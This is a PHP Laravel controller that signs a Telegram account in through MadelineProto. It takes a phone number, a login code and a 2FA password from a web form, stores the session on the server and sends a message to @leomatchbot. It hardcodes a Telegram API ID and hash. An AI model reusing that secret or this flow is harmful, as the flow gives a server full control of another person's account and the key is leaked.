<?php

namespace App\Http\Controllers\Back_doing;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

use danog\MadelineProto\API;
use danog\MadelineProto\Settings;
use danog\MadelineProto\Settings\AppInfo;



class Register_tg_account extends Controller
{
    public function register_number(Request $request)
    {
        $phone = $request->input('phone');
        $sessionFile = env('TELEGRAM_SESSION_FILE');

        $appInfo = (new AppInfo)
            ->setApiId(23309931)
            ->setApiHash('a1b55a9fa815fa90cf817b0390a430cf'); 

        $settings = new Settings();
        $settings->setAppInfo($appInfo);

        $MadelineProto = new API($sessionFile, $settings);

        $MadelineProto->phoneLogin($phone);

        session(['telegram_session' => $sessionFile]);
        return view('Doing.Auth_tg', ['isSecondFormVisible' => true]);
    }


    public function next_step_number(Request $request)
    {
        $code = $request->input('code');
        $password = $request->input('password');

        $sessionFile = session('telegram_session');

        if (!$sessionFile) {
            return redirect()->route('register')->withErrors('Сессия Telegram не найдена');
        }

        $appInfo = (new AppInfo)
            ->setApiId(23309931)
            ->setApiHash('a1b55a9fa815fa90cf817b0390a430cf'); 

        $settings = new Settings();
        $settings->setAppInfo($appInfo);

        $MadelineProto = new API($sessionFile, $settings);

        $authorization = $MadelineProto->completePhoneLogin($code);

        if (isset($authorization['_']) && $authorization['_'] === 'account.password') {
            // Обработка двухфакторной авторизации
            if (empty($password)) {
                return redirect()->route('register')->withErrors('Необходимо указать пароль для двухфакторной авторизации');
            }
            $authorization = $MadelineProto->complete2falogin($password);
        }
        
        $MadelineProto->messages->sendMessage([
            'peer' => '@leomatchbot',     // ID чата или @username
            'message' => "Приветики!", // Сообщение
        ]);

        return redirect()->route('success'); // Перенаправление на страницу успешной авторизации
    }
}